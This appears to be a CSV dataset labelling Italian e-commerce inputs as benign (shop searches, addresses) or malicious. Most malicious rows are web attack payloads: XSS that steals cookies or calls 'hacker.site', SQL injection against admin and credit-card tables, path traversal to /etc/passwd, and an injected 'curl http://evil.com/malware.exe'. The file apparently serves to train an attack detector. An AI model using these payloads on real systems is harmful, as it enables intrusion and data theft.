testo,etichetta
<script>alert('pwned')</script>,1
<script>alert('pwned')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
<script>alert('pwned')</script>,1
<script>alert('pwned')</script>,1
<script>fetch('http://hacker.site')</script>,1
"Via Garibaldi 222, Milano",0
cerco felpa rosso taglia XL,0
<script>fetch('http://hacker.site')</script>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
zaino porta pc 15 pollici,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
compra giacca online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
<script>alert(document.cookie)</script>,1
cerco maglietta nero taglia 43,0
'; DROP TABLE utenti; --,1
"<svg onload=""fetch('http://hacker.site')"">",1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert('pwned')"">",1
"<svg onload=""alert(document.cookie)"">",1
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"Via Garibaldi 49, Napoli",0
../../../../../../../etc/passwd,1
../../../../../../../../etc/passwd,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../../../../etc/passwd,1
; ipconfig /all,1
..%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE config; --,1
../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert('pwned')</script>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco felpa bianco taglia 42,0
../../../../../etc/passwd,1
"Via Mazzini 199, Napoli",0
"<svg onload=""fetch('http://hacker.site')"">",1
../../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
<script>alert(document.cookie)</script>,1
<script>alert('pwned')</script>,1
<script>fetch('http://hacker.site')</script>,1
<script>alert(document.cookie)</script>,1
"Via Roma 227, Genova",0
"Corso Italia 149, Palermo",0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
cerco pantaloni verde taglia 44,0
'; DROP TABLE config; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco zaino rosso taglia M,0
<script>fetch('http://hacker.site')</script>,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
"Corso Italia 84, Roma",0
"Via Roma 230, Palermo",0
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
<script>alert(document.cookie)</script>,1
"Via Roma 249, Napoli",0
../../../../../../../../etc/passwd,1
"<svg onload=""fetch('http://hacker.site')"">",1
<script>fetch('http://hacker.site')</script>,1
cioccolato fondente 85% extra,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Corso Italia 68, Genova",0
compra zaino online in offerta,0
compra orologio online in offerta,0
../../../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
compra pantaloni online in offerta,0
cerco pantaloni nero taglia S,0
../../../../etc/passwd,1
compra zaino online in offerta,0
cerco pantaloni rosso taglia S,0
compra orologio online in offerta,0
<script>alert('pwned')</script>,1
'; DROP TABLE carte_credito; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE clienti; --,1
"<svg onload=""alert('pwned')"">",1
"Via Garibaldi 94, Firenze",0
<script>alert('pwned')</script>,1
'; DROP TABLE sessions; --,1
..%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco zaino grigio taglia 43,0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE clienti; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
compra pantaloni online in offerta,0
'; DROP TABLE carte_credito; --,1
luca.bianchi@gmail.com,0
../../../../etc/passwd,1
compra giacca online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Mazzini 168, Napoli",0
../../../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
compra maglietta online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
giacca a vento impermeabile,0
"Via Dante 148, Genova",0
compra maglietta online in offerta,0
compra felpa online in offerta,0
cerco orologio nero taglia 41,0
compra zaino online in offerta,0
../../../../../etc/passwd,1
"' UNION SELECT null, @@version, null --",1
compra zaino online in offerta,0
<script>alert(document.cookie)</script>,1
"Via Dante 170, Torino",0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
'; DROP TABLE sessions; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
compra pantaloni online in offerta,0
"Via Milano 56, Roma",0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
<script>alert(document.cookie)</script>,1
"Corso Italia 175, Napoli",0
scarpe da corsa asics,0
<script>alert('pwned')</script>,1
compra zaino online in offerta,0
'; DROP TABLE carte_credito; --,1
"<svg onload=""alert(document.cookie)"">",1
compra scarpe online in offerta,0
"<svg onload=""alert(document.cookie)"">",1
"<svg onload=""alert('pwned')"">",1
../../../../../../etc/passwd,1
cerco giacca blu taglia 41,0
"Corso Italia 123, Torino",0
..%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
giochi da tavolo per famiglia,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
cerco giacca rosso taglia M,0
compra giacca online in offerta,0
compra scarpe online in offerta,0
admin' #,1
'; DROP TABLE admin; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
<script>alert(1)</script>,1
compra giacca online in offerta,0
<script>alert('pwned')</script>,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert(document.cookie)"">",1
cerco giacca blu taglia 44,0
"<svg onload=""fetch('http://hacker.site')"">",1
codice sconto benvenuto,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE admin; --,1
"Via Roma 70, Firenze",0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE config; --,1
compra scarpe online in offerta,0
'; DROP TABLE sessions; --,1
"Via Mazzini 130, Napoli",0
../../../../../../../etc/passwd,1
'; DROP TABLE carte_credito; --,1
'; DROP TABLE sessions; --,1
1' OR SLEEP(5) --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
compra pantaloni online in offerta,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Milano 203, Roma",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
admin' AND 1=1 --,1
<script>alert('pwned')</script>,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
"<svg onload=""fetch('http://hacker.site')"">",1
compra giacca online in offerta,0
"<svg onload=""fetch('http://hacker.site')"">",1
cerco felpa giallo taglia XL,0
../../../etc/passwd,1
compra pantaloni online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM config --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"Via Roma 96, Milano",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
<script>fetch('http://hacker.site')</script>,1
../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco felpa grigio taglia XL,0
compra orologio online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco pantaloni verde taglia 43,0
'; DROP TABLE config; --,1
<script>alert(document.cookie)</script>,1
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""alert(document.cookie)"">",1
../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Milano 124, Genova",0
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
compra giacca online in offerta,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>fetch('http://hacker.site')</script>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert('pwned')</script>,1
compra scarpe online in offerta,0
cerco orologio grigio taglia M,0
<script>alert(document.cookie)</script>,1
"<svg onload=""alert('pwned')"">",1
"Via Milano 93, Torino",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert('pwned')"">",1
../../../../etc/passwd,1
"<svg onload=""alert('pwned')"">",1
'; DROP TABLE sessions; --,1
'; DROP TABLE utenti; --,1
cerco giacca nero taglia 42,0
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
<script>alert(document.cookie)</script>,1
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2f%2fvar/www/html/config.php,1
cerco maglietta giallo taglia XL,0
../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco giacca verde taglia 41,0
../../../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
"<svg onload=""fetch('http://hacker.site')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
../../../../../../../../etc/passwd,1
"Via Milano 97, Genova",0
../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
orologio subacqueo impermeabile,0
../../../../../../etc/passwd,1
"Via Milano 183, Milano",0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
'; DROP TABLE clienti; --,1
..%2f%2f%2fvar/www/html/config.php,1
%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
<script>alert(document.cookie)</script>,1
..%2f%2f%2fvar/www/html/config.php,1
cerco pantaloni blu taglia 43,0
"Via Garibaldi 73, Palermo",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
../../../../../../../../etc/passwd,1
..%2f..%2f..%2f..%2fetc%2fpasswd,1
cerco maglietta grigio taglia 43,0
compra orologio online in offerta,0
"Corso Italia 64, Torino",0
'; DROP TABLE carte_credito; --,1
"Via Milano 58, Roma",0
cerco giacca bianco taglia 41,0
cerco felpa bianco taglia L,0
compra zaino online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE admin; --,1
1; DROP TABLE prodotti,1
../../../etc/passwd,1
"Corso Italia 167, Palermo",0
"Via Dante 42, Torino",0
"Via Milano 50, Firenze",0
../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
cerco orologio bianco taglia L,0
compra scarpe online in offerta,0
'; DROP TABLE clienti; --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
compra maglietta online in offerta,0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert(document.cookie)"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE carte_credito; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
cerco scarpe bianco taglia 42,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""alert('pwned')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"<svg onload=""alert(document.cookie)"">",1
"<svg onload=""alert(document.cookie)"">",1
../../../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
../../../../../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
"<svg onload=""fetch('http://hacker.site')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE sessions; --,1
"Via Dante 228, Genova",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
'; DROP TABLE config; --,1
cerco maglietta blu taglia 43,0
pantaloni cargo uomo verdi,0
'; DROP TABLE config; --,1
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
compra maglietta online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../../etc/passwd,1
compra giacca online in offerta,0
"<svg onload=""fetch('http://hacker.site')"">",1
compra felpa online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE carte_credito; --,1
tazza in ceramica personalizzata,0
../../../etc/passwd,1
compra felpa online in offerta,0
"Via Roma 15, Milano",0
cerco giacca blu taglia M,0
1' OR 'a'='a' UNION SELECT * FROM config --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE config; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
'; DROP TABLE clienti; --,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM config --,1
cerco felpa verde taglia L,0
..%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert('pwned')"">",1
'; DROP TABLE carte_credito; --,1
"Via Milano 183, Torino",0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
cerco scarpe giallo taglia 44,0
..%2f%2f%2fvar/www/html/config.php,1
cerco orologio rosso taglia S,0
../../../../../../../../etc/passwd,1
'; DROP TABLE utenti; --,1
/etc/shadow,1
cerco zaino blu taglia 44,0
'; DROP TABLE clienti; --,1
../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE carte_credito; --,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
compra scarpe online in offerta,0
olio extravergine di oliva 1L,0
; curl http://evil.com/malware.exe,1
<script>alert('pwned')</script>,1
'; DROP TABLE utenti; --,1
<script>fetch('http://hacker.site')</script>,1
info@azienda.com,0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert('pwned')"">",1
../../../../etc/passwd,1
cerco orologio bianco taglia 43,0
..%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
'; DROP TABLE clienti; --,1
'; DROP TABLE admin; --,1
compra zaino online in offerta,0
cerco scarpe rosso taglia 44,0
..%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
<script>fetch('http://hacker.site')</script>,1
cerco orologio rosso taglia 41,0
compra orologio online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM config --,1
../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert('pwned')"">",1
cerco pantaloni grigio taglia 42,0
cerco felpa giallo taglia M,0
"<svg onload=""alert(document.cookie)"">",1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
'; DROP TABLE sessions; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Dante 49, Firenze",0
calze sportive bianche,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
pasta di semola trafilata al bronzo,0
"<svg onload=""alert('pwned')"">",1
"Via Garibaldi 156, Roma",0
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE admin; --,1
../../../../../../etc/passwd,1
..%2f%2f%2f%2fvar/www/html/config.php,1
"Via Dante 219, Napoli",0
../../../../../etc/passwd,1
cerco felpa bianco taglia 44,0
"Via Dante 19, Genova",0
../../../../../etc/passwd,1
cerco maglietta blu taglia 42,0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
"Via Milano 22, Napoli",0
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
'; DROP TABLE utenti; --,1
cerco pantaloni bianco taglia XL,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
compra scarpe online in offerta,0
../../../../../../etc/passwd,1
'; DROP TABLE config; --,1
compra maglietta online in offerta,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
..%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
compra maglietta online in offerta,0
cerco scarpe blu taglia 44,0
"Via Mazzini 143, Milano",0
cerco orologio nero taglia S,0
'; DROP TABLE config; --,1
"Via Mazzini 248, Napoli",0
"<svg onload=""alert('pwned')"">",1
../../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
../../../../../etc/passwd,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
"<svg onload=""fetch('http://hacker.site')"">",1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
"Via Roma 89, Bologna",0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
cappello da baseball regolabile,0
cerco zaino bianco taglia 44,0
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE admin; --,1
'; DROP TABLE carte_credito; --,1
'; DROP TABLE clienti; --,1
"<svg onload=""alert(document.cookie)"">",1
<script>fetch('http://hacker.site')</script>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
/var/log/apache2/access.log,1
..%2f%2f%2fvar/www/html/config.php,1
cerco scarpe giallo taglia L,0
<script>alert(document.cookie)</script>,1
cerco orologio rosso taglia 43,0
"<svg onload=""alert(document.cookie)"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
<script>fetch('http://hacker.site')</script>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"<svg onload=""fetch('http://hacker.site')"">",1
<script>alert(document.cookie)</script>,1
"<svg onload=""fetch('http://hacker.site')"">",1
../../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
"<svg onload=""alert('pwned')"">",1
<script>alert('pwned')</script>,1
cerco zaino rosso taglia S,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<script>fetch('http://hacker.site')</script>,1
../../../../../etc/passwd,1
compra felpa online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
compra giacca online in offerta,0
"Via Torino 24, Torino",0
'; DROP TABLE sessions; --,1
<script>fetch('http://hacker.site')</script>,1
..%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE utenti; --,1
"Via Dante 128, Milano",0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE config; --,1
'; DROP TABLE clienti; --,1
<script>alert('pwned')</script>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE clienti; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE clienti; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
cerco orologio nero taglia 43,0
<script>fetch('http://hacker.site')</script>,1
spedizione tracciabile,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE sessions; --,1
"Via Roma 213, Roma",0
../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
<script>alert('pwned')</script>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
"<svg onload=""alert('pwned')"">",1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
'; DROP TABLE clienti; --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
compra orologio online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra felpa online in offerta,0
"<svg onload=""fetch('http://hacker.site')"">",1
compra giacca online in offerta,0
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>fetch('http://hacker.site')</script>,1
../../../../../etc/passwd,1
'; DROP TABLE config; --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE utenti; --,1
cerco pantaloni nero taglia 44,0
..%2f%2f%2fvar/www/html/config.php,1
../../../../etc/passwd,1
"Corso Vittorio Emanuele 100, Roma",0
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
compra pantaloni online in offerta,0
"<svg onload=""fetch('http://hacker.site')"">",1
cerco giacca blu taglia XL,0
../../../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert(document.cookie)"">",1
cerco scarpe giallo taglia 41,0
<script>fetch('http://hacker.site')</script>,1
<script>fetch('http://hacker.site')</script>,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
"Corso Italia 210, Milano",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra felpa online in offerta,0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE admin; --,1
../../../../../../../etc/passwd,1
cerco pantaloni bianco taglia M,0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2fvar/www/html/config.php,1
compra giacca online in offerta,0
"Corso Italia 58, Milano",0
"Via Roma 198, Torino",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
'; DROP TABLE carte_credito; --,1
compra felpa online in offerta,0
"<svg onload=""fetch('http://hacker.site')"">",1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<script>alert('pwned')</script>,1
..%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert('pwned')</script>,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
compra felpa online in offerta,0
cerco pantaloni verde taglia L,0
cerco maglietta blu taglia 44,0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
cerco orologio verde taglia 42,0
' OR 1=1 --,1
cerco maglietta blu taglia 43,0
"Via Garibaldi 225, Bologna",0
compra scarpe online in offerta,0
"<svg onload=""alert('pwned')"">",1
<script>fetch('http://hacker.site')</script>,1
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
..%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert('pwned')"">",1
'; DROP TABLE admin; --,1
cerco pantaloni giallo taglia 43,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE config; --,1
<script>alert(document.cookie)</script>,1
compra scarpe online in offerta,0
